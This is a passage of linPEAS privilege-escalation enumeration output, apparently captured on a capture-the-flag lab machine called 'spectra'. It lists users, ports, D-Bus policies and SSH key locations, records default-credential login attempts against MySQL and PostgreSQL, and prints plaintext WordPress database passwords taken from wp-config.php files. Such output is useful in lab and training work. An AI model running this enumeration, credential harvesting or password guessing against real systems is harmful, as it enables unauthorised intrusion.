+        <policy user="shill">
+        <policy user="chronos">
+        <policy user="debugd">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.bluez.conf (  <policy user="bluetooth">
+  <policy user="chronos">
+  <policy user="cras">
+  <policy user="power">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.AnomalyEventService.conf (  <policy user="crosvm">)                                                                                                                
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Attestation.conf (  <policy user="attestation">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.AuthPolicy.conf (  <policy user="authpolicyd">
+  <policy user="chronos">
+  <policy user="smbproviderd">
+  <policy user="fuse-smbfs">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Bluetooth.conf (  <policy user="bluetooth">
+  <policy user="chronos">
+  <policy user="power">
+  <policy user="cras">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Brltty.conf (  <policy user="brltty">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Chaps.conf (  <policy user="chaps">
+  <policy user="shill">
+  <policy user="arc-keymasterd">
+  <policy user="cdm-oemcrypto">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Chaps.conf (  <policy group="pkcs11">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Chunneld.conf (  <policy user="chunneld">
+  <policy user="vm_cicerone">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.CrosDisks.conf (  <policy user="cros-disks">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.CrosDns.conf (  <policy user="crosdns">
+  <policy user="vm_cicerone">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.CrosHealthd.conf (  <policy user="cros_healthd">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.ImageLoader.conf (  <policy user="imageloaderd">
+  <policy user="chronos">
+  <policy user="dlcservice">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Kerberos.conf (  <policy user="kerberosd">
+  <policy user="chronos">
+  <policy user="smbproviderd">
+  <policy user="fuse-smbfs">
+  <policy user="system-proxy">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.MachineLearning.conf (  <policy user="ml-service">                                                                                                                 
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Mtpd.conf (  <policy user="mtp">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.OobeConfigRestore.conf (  <policy user="oobe_config_restore">                                                                                                      
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Patchpanel.conf (  <policy user="crosvm">
+  <policy user="tlsdate">
+  <policy user="system-proxy">
+  <policy user="shill">
+  <policy user="devbroker">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.PcaAgent.conf (  <policy user="attestation">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.PermissionBroker.conf (  <policy user="chronos">
+  <policy user="cfm-monitor">
+  <policy user="chunneld">
+  <policy user="devbroker">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.PowerManager.conf (  <policy user="power">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Seneschal.conf (  <policy user="seneschal-dbus">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.SmbProvider.conf (  <policy user="smbproviderd">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.SystemProxy.conf (  <policy user="system-proxy">
+   <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.TpmManager.conf (  <policy user="tpm_manager">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.Trunks.conf (  <policy user="trunks">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.UserDataAuth.conf (  <policy user="cryptohome">
+  <policy user="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.VmCicerone.conf (  <policy user="vm_cicerone">
+  <policy user="crosvm">
+  <policy user="chronos">
+  <policy user="debugd">
+  <policy user="chunneld">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.VmConcierge.conf (  <policy user="crosvm">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.cras.conf (  <policy user="cras">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.debugd.conf (  <policy user="debugd">
+  <policy user="chronos">
+  <policy user="runtime_probe">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.flimflam.conf (    <policy user="shill">
+    <policy user="system">
+    <policy user="chronos">
+    <policy user="modem">
+    <policy user="debugd">
+    <policy user="crash">
+    <policy user="shill-scripts">
+    <policy user="openvpn">
+    <policy user="wpa">
+    <policy user="dhcp">
+    <policy user="buffet">
+    <policy user="patchpaneld">
+    <policy user="rialtod">
+    <policy user="runtime_probe">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.chromium.lorgnette.conf (    <policy user="saned">
+    <policy user="chronos">
+    <policy user="debugd">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf (  <policy user="modem">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.torproject.tlsdate.conf (  <policy user="tlsdate">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.torproject.tlsdate.conf (  <policy group="chronos">)
+Possible weak user policy found on /etc/dbus-1/system.d/org.usbguard1.conf (  <policy user="usbguard">
+  <policy user="chronos">)
+
+╔══════════╣ D-Bus Service Objects list
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                 
+busctl Not Found                                                                                                    
+                                                                                                                    
+
+════════════════════════════════════╣ Network Information ╠════════════════════════════════════
+╔══════════╣ Hostname, hosts and DNS                                                                                
+spectra                                                                                                             
+
+127.0.0.1       localhost
+::1             localhost
+
+nameserver 8.8.4.4
+nameserver 8.8.8.8
+nameserver 0.0.0.0
+nameserver 0.0.0.0
+options single-request timeout:1 attempts:5
+dnsdomainname Not Found
+                                                                                                                    
+╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found                                                                                           
+                                                                                                                    
+╔══════════╣ Interfaces
+# /etc/networks                                                                                                     
+#
+# This file describes a number of netname-to-adress
+# mappings for the TCP/IP subsytem. It is mostly
+# used at boot time, when no name servers are running.
+#
+
+loopback        127.0.0.0
+link-local      169.254.0.0
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.229  netmask 255.255.255.0  broadcast 10.10.10.255
+        inet6 fe80::250:56ff:feb9:956a  prefixlen 64  scopeid 0x20<link>
+        inet6 dead:beef::250:56ff:feb9:956a  prefixlen 64  scopeid 0x0<global>
+        inet6 dead:beef::59fc:501a:43c4:70c8  prefixlen 64  scopeid 0x0<global>
+        ether 00:50:56:b9:95:6a  txqueuelen 1000  (Ethernet)
+        RX packets 983  bytes 582333 (568.6 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1663  bytes 591440 (577.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 1479  bytes 576268 (562.7 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1479  bytes 576268 (562.7 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+╔══════════╣ Networks and neighbours
+Kernel IP routing table                                                                                             
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+10.10.10.0      0.0.0.0         255.255.255.0   U     0      0        0 eth0
+Address                  HWtype  HWaddress           Flags Mask            Iface
+10.10.10.2               ether   00:50:56:b9:49:dc   C                     eth0
+
+╔══════════╣ Iptables rules
+iptables rules Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      3825/sh             
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+
+╔══════════╣ Can I sniff with tcpdump?
+No                                                                                                                  
+                                                                                                                    
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+╔══════════╣ My user                                                                                                
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                 
+uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)                                                               
+
+╔══════════╣ Do I have PGP keys?
+/usr/bin/gpg                                                                                                        
+netpgpkeys Not Found
+netpgp Not Found                                                                                                    
+                                                                                                                    
+╔══════════╣ Clipboard or highlighted text?
+xsel and xclip Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                         
+                                                                                                                    
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                   
+/proc/sys/kernel/yama/ptrace_scope is not enabled (1)                                                               
+gdb was found in PATH
+
+╔══════════╣ Checking doas.conf
+/etc/doas.conf Not Found                                                                                            
+                                                                                                                    
+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2               
+                                                                                                                    
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/bash                                                                                     
+
+╔══════════╣ Users with console
+chronos:x:1000:1000:system_user:/home/chronos/user:/bin/bash                                                        
+katie:x:20156:20157::/home/katie:/bin/bash
+nginx:x:20155:20156::/home/nginx:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel),11(floppy),26(tape),27(video),1001(chronos-access),219(wpa),207(tss),208(pkcs11),253(preserve)                                               
+uid=1(bin) gid=1(bin) groups=1(bin),2(daemon[0m),3(sys)
+uid=10(uucp) gid=14(uucp) groups=14(uucp),402(serial)
+uid=1000(chronos) gid=1000(chronos) groups=1000(chronos),7(lp),18(audio),27(video),222(input),1001(chronos-access),420(crash-user-access),600(cras),304(fuse-drivefs),240(brltty),208(pkcs11),303(policy-readers),601(wayland)
+uid=1001(chronos-access) gid=1001(chronos-access) groups=1001(chronos-access)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),4(adm)
+uid=201(messagebus) gid=201(messagebus) groups=201(messagebus)
+uid=20100(ippusb) gid=20100(ippusb) groups=20100(ippusb)
+uid=20104(shill) gid=20104(shill) groups=20104(shill),611(password-viewers),413(tun),212(ipsec),241(modem),303(policy-readers),400(daemon[0m-store),605(debugfs-access)
+uid=20105(netperf) gid=20105(netperf) groups=20105(netperf)
+uid=20106(ml-service) gid=20106(ml-service) groups=20106(ml-service)
+uid=20107(bootlockboxd) gid=20107(bootlockboxd) groups=20107(bootlockboxd),207(tss)
+uid=20110(crosdns) gid=20110(crosdns) groups=20110(crosdns)
+uid=20112(vm_cicerone) gid=20112(vm_cicerone) groups=20112(vm_cicerone),420(crash-user-access)
+uid=20114(seneschal) gid=20114(seneschal) groups=20114(seneschal)
+uid=20115(seneschal-dbus) gid=20115(seneschal-dbus) groups=20115(seneschal-dbus)
+uid=20121(oobe_config_restore) gid=20121(oobe_config_restore) groups=20121(oobe_config_restore),207(tss)
+uid=20122(oobe_config_save) gid=20122(oobe_config_save) groups=20122(oobe_config_save),207(tss)
+uid=20123(usbguard) gid=20123(usbguard) groups=20123(usbguard)
+uid=20124(usb_bouncer) gid=20124(usb_bouncer) groups=20124(usb_bouncer)
+uid=20128(pluginvm) gid=20128(pluginvm) groups=20128(pluginvm),601(wayland)
+uid=20130(fwupd) gid=20130(fwupd) groups=20130(fwupd)
+uid=20131(kerberosd) gid=20131(kerberosd) groups=20131(kerberosd),611(password-viewers)
+uid=20134(cros_healthd) gid=20134(cros_healthd) groups=20134(cros_healthd),6(disk)
+uid=20137(crash) gid=20137(crash) groups=20137(crash),1001(chronos-access),419(crash-access),420(crash-user-access)
+uid=20138(kerberosd-exec) gid=20138(kerberosd-exec) groups=20138(kerberosd-exec),20131(kerberosd)
+uid=20140(metrics) gid=20140(metrics) groups=20140(metrics),605(debugfs-access)
+uid=20141(chunneld) gid=20141(chunneld) groups=20141(chunneld)
+uid=20142(healthd_ec) gid=20142(healthd_ec) groups=20142(healthd_ec),416(cros_ec-access)
+uid=20154(system-proxy) gid=20154(system-proxy) groups=20154(system-proxy)
+uid=20155(nginx) gid=20156(nginx) groups=20156(nginx)
+uid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)
+uid=202(syslog) gid=202(syslog) groups=202(syslog)
+uid=204(sshd) gid=204(sshd) groups=204(sshd)
+uid=207(tss) gid=207(tss) groups=207(tss)
+uid=208(pkcs11) gid=208(pkcs11) groups=208(pkcs11)
+uid=212(ipsec) gid=212(ipsec) groups=212(ipsec),20104(shill),1001(chronos-access),208(pkcs11)
+uid=213(cros-disks) gid=213(cros-disks) groups=213(cros-disks),6(disk),19(cdrom),80(cdrw),1001(chronos-access)
+uid=215(tcpdump) gid=215(tcpdump) groups=215(tcpdump)
+uid=216(debugd) gid=216(debugd) groups=216(debugd)
+uid=217(openvpn) gid=217(openvpn) groups=217(openvpn)
+uid=218(bluetooth) gid=218(bluetooth) groups=218(bluetooth),258(uinput)
+uid=219(wpa) gid=219(wpa) groups=219(wpa),208(pkcs11)
+uid=220(imageloaderd) gid=220(imageloaderd) groups=220(imageloaderd),1001(chronos-access)
+uid=222(input) gid=222(input) groups=222(input)
+uid=223(chaps) gid=223(chaps) groups=223(chaps),207(tss),208(pkcs11),400(daemon[0m-store)
+uid=224(dhcp) gid=224(dhcp) groups=224(dhcp)
+uid=226(mtp) gid=226(mtp) groups=226(mtp),85(usb)
+uid=228(power) gid=228(power) groups=228(power),5(tty),222(input),404(i2c),416(cros_ec-access),600(cras),605(debugfs-access)                                                                                                            
+uid=230(devbroker) gid=230(devbroker) groups=230(devbroker)
+uid=232(nfqueue) gid=232(nfqueue) groups=232(nfqueue)
+uid=233(tlsdate-dbus) gid=233(tlsdate-dbus) groups=233(tlsdate-dbus)
+uid=234(tlsdate) gid=234(tlsdate) groups=234(tlsdate)
+uid=235(debugd-logs) gid=235(debugd-logs) groups=235(debugd-logs),401(logs-access)
+uid=237(shill-crypto) gid=237(shill-crypto) groups=237(shill-crypto)
+uid=238(avahi) gid=238(avahi) groups=238(avahi)
+uid=239(p2p) gid=239(p2p) groups=239(p2p)
+uid=240(brltty) gid=240(brltty) groups=240(brltty),5(tty),85(usb)
+uid=241(modem) gid=241(modem) groups=241(modem),85(usb)
+uid=247(attestation) gid=247(attestation) groups=247(attestation),207(tss),208(pkcs11),253(preserve),303(policy-readers)
+uid=250(portage) gid=250(portage) groups=250(portage)
+uid=251(trunks) gid=251(trunks) groups=251(trunks),207(tss)
+uid=252(tpm_manager) gid=252(tpm_manager) groups=252(tpm_manager),207(tss),253(preserve)
+uid=254(authpolicyd) gid=254(authpolicyd) groups=254(authpolicyd),303(policy-readers)
+uid=255(saned) gid=255(scanner) groups=255(scanner),20100(ippusb),20155(usbprinter)
+uid=268(dnsmasq) gid=268(dnsmasq) groups=268(dnsmasq)
+uid=269(lpadmin) gid=269(lpadmin) groups=269(lpadmin),7(lp),20100(ippusb)
+uid=277(cups) gid=277(cups) groups=277(cups),7(lp),269(lpadmin),20100(ippusb),20155(usbprinter)
+uid=284(patchpaneld) gid=284(patchpaneld) groups=284(patchpaneld)
+uid=292(cryptohome) gid=292(cryptohome) groups=292(cryptohome)
+uid=295(shill-scripts) gid=295(shill-scripts) groups=295(shill-scripts)
+uid=297(smbproviderd) gid=297(smbproviderd) groups=297(smbproviderd)
+uid=299(crosvm) gid=299(crosvm) groups=299(crosvm),27(video),413(tun),600(cras),20128(pluginvm),418(virtaccess),601(wayland),400(daemon[0m-store)                                                                                       
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys),6(disk)
+uid=300(ntfs-3g) gid=300(ntfs-3g) groups=300(ntfs-3g)
+uid=302(fuse-exfat) gid=302(fuse-exfat) groups=302(fuse-exfat)
+uid=304(fuse-drivefs) gid=304(fuse-drivefs) groups=304(fuse-drivefs)
+uid=305(fuse-sshfs) gid=305(fuse-sshfs) groups=305(fuse-sshfs)
+uid=307(fuse-smbfs) gid=307(fuse-smbfs) groups=307(fuse-smbfs)
+uid=308(fuse-rar2fs) gid=308(fuse-rar2fs) groups=308(fuse-rar2fs)
+uid=309(fuse-zip) gid=309(fuse-zip) groups=309(fuse-zip)
+uid=4(lp) gid=7(lp) groups=7(lp),20100(ippusb)
+uid=600(cras) gid=600(cras) groups=600(cras),18(audio),222(input)
+uid=601(wayland) gid=601(wayland) groups=601(wayland)
+uid=605(debugfs-access) gid=605(debugfs-access) groups=605(debugfs-access)
+uid=607(authpolicyd-exec) gid=607(authpolicyd-exec) groups=607(authpolicyd-exec),254(authpolicyd)
+uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
+uid=9(news) gid=13(news) groups=13(news)
+
+╔══════════╣ Login now
+ 14:23:56 up 21 min,  0 users,  load average: 0.09, 0.06, 0.08                                                      
+USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
+
+╔══════════╣ Last logons
+                                                                                                                    
+╔══════════╣ Last time logon each user
+                                                                                                                    
+╔══════════╣ Password policy
+PASS_MAX_DAYS   99999                                                                                               
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)                                                                                              
+                                                                                                                    
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+                                                                                                                    
+
+
+════════════════════════════════════╣ Software Information ╠════════════════════════════════════
+╔══════════╣ MySQL version                                                                                          
+mysql  Ver 14.14 Distrib 5.7.20-19, for Linux (x86_64) using  6.3                                                   
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No                                                          
+═╣ MySQL connection using root/NOPASS ................. No                                                          
+╔══════════╣ Searching mysql credentials and exec                                                                   
+ Not Found                                                                                                          
+                                                                                                                    
+╔══════════╣ Analyzing PostgreSQL Files (limit 70)
+Version: psql Not Found                                                                                             
+                                                                                                                    
+pgadmin*.db Not Found
+                                                                                                                    
+pg_hba.conf Not Found
+                                                                                                                    
+postgresql.conf Not Found
+                                                                                                                    
+pgsql.conf Not Found
+                                                                                                                    
+═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
+═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No                                             
+═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No                                             
+═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No                                             
+                                                                                                                    
+╔══════════╣ Analyzing Mongo Files (limit 70)
+Version: mongo Not Found                                                                                            
+mongod Not Found                                                                                                    
+                                                                                                                    
+mongod*.conf Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Apache Files (limit 70)
+Version: apache2 Not Found                                                                                          
+httpd Not Found                                                                                                     
+                                                                                                                    
+══╣ PHP exec extensions
+sites-enabled Not Found                                                                                             
+                                                                                                                    
+000-default.conf Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Tomcat Files (limit 70)
+tomcat-users.xml Not Found                                                                                          
+                                                                                                                    
+╔══════════╣ Analyzing FastCGI Files (limit 70)
+-rw-r--r-- 1 chronos chronos 1007 Sep 27  2019 /mnt/stateful_partition/dev_image/share/nginx/conf/fastcgi_params    
+-rw-r--r-- 1 chronos chronos 1007 Sep 27  2019 /usr/local/share/nginx/conf/fastcgi_params
+
+╔══════════╣ Analyzing Http conf Files (limit 70)
+httpd.conf Not Found                                                                                                
+                                                                                                                    
+╔══════════╣ Analyzing Htpasswd Files (limit 70)
+.htpasswd Not Found                                                                                                 
+                                                                                                                    
+╔══════════╣ Analyzing PHP Sessions Files (limit 70)
+/var/lib/php/sessions Not Found                                                                                     
+sess_* Not Found                                                                                                    
+                                                                                                                    
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 nginx nginx 3337 Feb 25 07:45 /mnt/stateful_partition/dev_image/share/nginx/html/main/wp-config.php    
+define( 'DB_NAME', 'dev' );
+define( 'DB_USER', 'dev' );
+define( 'DB_PASSWORD', 'development01' );
+define( 'DB_HOST', 'localhost' );
+-rw-r--r-- 1 nginx nginx 2997 Oct 27  2020 /mnt/stateful_partition/dev_image/share/nginx/html/testing/wp-config.php
+define( 'DB_NAME', 'dev' );
+define( 'DB_USER', 'devtest' );
+define( 'DB_PASSWORD', 'devteam01' );
+define( 'DB_HOST', 'localhost' );
+-rw-r--r-- 1 nginx nginx 3337 Feb 25 07:45 /usr/local/share/nginx/html/main/wp-config.php
+define( 'DB_NAME', 'dev' );
+define( 'DB_USER', 'dev' );
+define( 'DB_PASSWORD', 'development01' );
+define( 'DB_HOST', 'localhost' );
+-rw-r--r-- 1 nginx nginx 2997 Oct 27  2020 /usr/local/share/nginx/html/testing/wp-config.php
+define( 'DB_NAME', 'dev' );
+define( 'DB_USER', 'devtest' );
+define( 'DB_PASSWORD', 'devteam01' );
+define( 'DB_HOST', 'localhost' );
+
+╔══════════╣ Analyzing Drupal Files (limit 70)
+settings.php Not Found                                                                                              
+                                                                                                                    
+╔══════════╣ Analyzing Moodle Files (limit 70)
+config.php Not Found                                                                                                
+                                                                                                                    
+╔══════════╣ Analyzing Supervisord Files (limit 70)
+supervisord.conf Not Found                                                                                          
+                                                                                                                    
+╔══════════╣ Analyzing Cesi Files (limit 70)
+cesi.conf Not Found                                                                                                 
+                                                                                                                    
+╔══════════╣ Analyzing Rsync Files (limit 70)
+-rw-r--r-- 1 chronos chronos 401 Nov 22  2019 /mnt/stateful_partition/dev_image/etc/rsyncd.conf                     
+pid file = /run/rsyncd.pid
+use chroot = yes
+read only = yes
+-rw-r--r-- 1 chronos chronos 401 Nov 22  2019 /usr/local/etc/rsyncd.conf
+pid file = /run/rsyncd.pid
+use chroot = yes
+read only = yes
+
+rsyncd.secrets Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Hostapd Files (limit 70)
+hostapd.conf Not Found                                                                                              
+                                                                                                                    
+╔══════════╣ Searching wifi conns file
+ Not Found                                                                                                          
+                                                                                                                    
+╔══════════╣ Analyzing Anaconda ks Files (limit 70)
+anaconda-ks.cfg Not Found                                                                                           
+                                                                                                                    
+╔══════════╣ Analyzing VNC Files (limit 70)
+.vnc Not Found                                                                                                      
+                                                                                                                    
+*vnc*.c*nf* Not Found
+                                                                                                                    
+*vnc*.ini Not Found
+                                                                                                                    
+*vnc*.txt Not Found
+                                                                                                                    
+*vnc*.xml Not Found
+                                                                                                                    
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                                                
+ldap Not Found
+                                                                                                                    
+╔══════════╣ Analyzing OpenVPN Files (limit 70)
+*.ovpn Not Found                                                                                                    
+                                                                                                                    
+╔══════════╣ Searching ssl/ssh files
+╔══════════╣ Analyzing SSH Files (limit 70)                                                                         
+id_dsa* Not Found                                                                                                   
+                                                                                                                    
+-rw------- 1 root root 1671 Jan 15  2021 /usr/share/chromeos-ssh-config/keys/id_rsa
+-rw-r--r-- 1 root root 399 Jan 15  2021 /usr/share/chromeos-ssh-config/keys/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvsNpFdK5lb0GfKx+FgsrsM/2+aZVFYXHMPdvGtTz63ciRhq0Jnw7nln1SOcHraSz3/imECBg8NHIKV6rA+B9zbf7pZXEv20x5Ul0vrcPqYWC44PTtgsgvi8s0KZUZN93YlcjZ+Q7BjQ/tuwGSaLWLqJ7hnHALMJ3dbEM9fKBHQBCrG5HOaWD2gtXj7jp04M/WUnDDdemq/KMg6E9jcrJOiQ39IuTpas4hLQzVkKAKSrpl6MY2etHyoNarlWhcOwitArEDwf3WgnctwKstI/MTKB5BTpO2WXUNUv4kXzA+g8/l1aljIG13vtd9A/IV3KFVx/sLkkjuZ7z2rQXyNKuJw== ChromeOS test key
+
+known_hosts Not Found
+                                                                                                                    
+authorized_hosts Not Found
+                                                                                                                    
+-rw-r--r-- 1 root root 399 Jan 15  2021 /usr/share/chromeos-ssh-config/keys/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAvsNpFdK5lb0GfKx+FgsrsM/2+aZVFYXHMPdvGtTz63ciRhq0Jnw7nln1SOcHraSz3/imECBg8NHIKV6rA+B9zbf7pZXEv20x5Ul0vrcPqYWC44PTtgsgvi8s0KZUZN93YlcjZ+Q7BjQ/tuwGSaLWLqJ7hnHALMJ3dbEM9fKBHQBCrG5HOaWD2gtXj7jp04M/WUnDDdemq/KMg6E9jcrJOiQ39IuTpas4hLQzVkKAKSrpl6MY2etHyoNarlWhcOwitArEDwf3WgnctwKstI/MTKB5BTpO2WXUNUv4kXzA+g8/l1aljIG13vtd9A/IV3KFVx/sLkkjuZ7z2rQXyNKuJw== ChromeOS test key
+
+
+══╣ Possible private SSH keys were found!
+/mnt/stateful_partition/dev_image/lib64/libssh2.a
+/mnt/stateful_partition/dev_image/lib64/libgio-2.0.so.0.6400.1
+/mnt/stateful_partition/dev_image/lib64/python2.7/site-packages/cherrypy/test/test.pem
+/mnt/stateful_partition/dev_image/lib64/python2.7/site-packages/heatmap/remote/data/testing_rsa
+/mnt/stateful_partition/dev_image/lib64/python2.7/site-packages/webplot/remote/data/testing_rsa
+/mnt/stateful_partition/dev_image/lib64/libssh2.so.1.0.1
+/mnt/stateful_partition/dev_image/lib64/libgnutls.so.30.26.2
+/mnt/stateful_partition/dev_image/share/misc/magic.mgc
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/doc/misc/npm-config.md
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/html/doc/misc/npm-config.html
+/mnt/stateful_partition/dev_image/share/nodebrew/node/v8.9.4/lib/node_modules/npm/node_modules/request/node_modules/http-signature/http_signing.md                                                                                      
+/mnt/stateful_partition/dev_image/share/tast/data/chromiumos/tast/local/bundles/cros/security/data/openssl_blacklist_cert.key                                                                                                           
+/mnt/stateful_partition/dev_image/bin/gnutls-cli
+/mnt/stateful_partition/dev_image/libexec/tast/bundles/local/cros
+/mnt/stateful_partition/dev_image/lib/python2.7/test/badcert.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/badkey.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/keycert.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/ssl_key.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/badcert.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/badkey.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/keycert.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/ssl_key.passwd.pem
+
+══╣ Some certificates were found (out limited):
+/etc/pki/fwupd-metadata/LVFS-CA.pem                                                                                 
+/etc/pki/fwupd/LVFS-CA.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/allsans.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/badcert.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/badkey.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/keycert.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/keycert.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/keycert2.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/nullcert.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/selfsigned_pythontestdotnet.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/ssl_cert.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/ssl_key.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/ssl_key.pem
+/mnt/stateful_partition/dev_image/lib/python2.7/test/talos-2019-0758.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/allsans.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/badcert.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/badkey.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/keycert.passwd.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/keycert.pem
+/mnt/stateful_partition/dev_image/lib/python3.8/test/keycert2.pem
+4152PSTORAGE_CERTSBIN
+
+══╣ Some client certificates were found:
+/mnt/stateful_partition/dev_image/share/cmake-3.17/Templates/Windows/Windows_TemporaryKey.pfx                       
+/usr/local/share/cmake-3.17/Templates/Windows/Windows_TemporaryKey.pfx
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+        UserKnownHostsFile /home/chronos/user/.ssh/known_hosts
+
+╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
+auth       include      system-remote-login                                                                         
+
+╔══════════╣ NFS exports?
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe                
+/etc/exports Not Found                                                                                              
+                                                                                                                    
